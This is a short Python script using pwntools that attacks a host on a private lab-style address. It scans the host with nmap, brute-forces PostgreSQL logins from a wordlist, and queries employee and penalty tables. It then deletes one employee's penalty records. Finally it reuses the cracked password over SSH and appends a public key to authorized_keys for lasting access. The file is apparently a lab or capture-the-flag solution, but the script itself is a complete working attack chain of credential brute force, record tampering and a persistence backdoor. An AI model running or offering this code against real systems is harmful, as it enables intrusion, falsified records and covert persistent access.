import os
from pwn import *

IP = "192.168.56.11"

wordlist = open("wordlist.txt", "r").read().splitlines()
public_key = open("key.pub", "r").read()

os.system(f"nmap -sV {IP}")

def bruteforce():
    for username in wordlist:
        for password in wordlist:
            code = os.system(f"psql \"sslmode=disable host={IP} user={username} password={password}\" -c \"\" > /dev/null 2>&1")
            if code == 0:
                return (username, password)
    return ("", "")

username, password = bruteforce()
db = process(f"psql \"sslmode=disable host={IP} user={username} password={password}\"", shell=True)
db.sendline(b"SELECT * FROM employees;")
db.recvrepeat(0.5)
db.sendline(b"SELECT * FROM employees WHERE username='super';")
db.recvrepeat(0.5)
db.sendline(b"SELECT * FROM penalties;")
db.recvrepeat(0.5)
db.sendline(b"SELECT SUM(penalty) FROM penalties WHERE employee_id=6;")
db.recvrepeat(0.5)
db.sendline(b"DELETE FROM penalties WHERE employee_id=6;")
db.recvrepeat(0.5)
db.sendline(b"SELECT * FROM penalties;")
db.recvrepeat(0.5)
db.sendline(b"\\q")

ssh = process(f"sshpass -p {password} ssh {username}@{IP}", shell=True)
ssh.sendline(b"ls -al")
ssh.recvrepeat(0.5)
ssh.sendline(b"ls -al .ssh")
ssh.recvrepeat(0.5)
ssh.sendline(b"cat .ssh/authorized_keys")
ssh.recvrepeat(0.5)
ssh.sendline(f"echo '{public_key}' >> .ssh/authorized_keys".encode())
ssh.recvrepeat(0.5)
ssh.sendline(b"cat .ssh/authorized_keys")
ssh.recvrepeat(0.5)
ssh.sendline(b"exit")
